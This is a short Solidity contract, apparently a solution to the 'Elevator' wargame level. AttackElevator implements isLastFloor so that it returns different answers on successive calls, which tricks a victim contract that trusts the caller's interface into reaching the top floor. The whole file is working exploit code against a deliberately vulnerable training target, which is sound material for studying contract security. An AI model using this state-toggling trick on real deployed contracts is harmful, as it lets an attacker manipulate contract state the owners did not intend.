// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Elevator.sol";

contract AttackElevator {
    Elevator victim;
    bool public top;
    uint public floor;

    constructor(address _victim) {
        victim = Elevator(_victim);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        bool currentTop = top;
        top = !top; // Toggle the state for the next call
        return currentTop;
    }

    function attack() public {
        victim.goTo(4);
    }
}
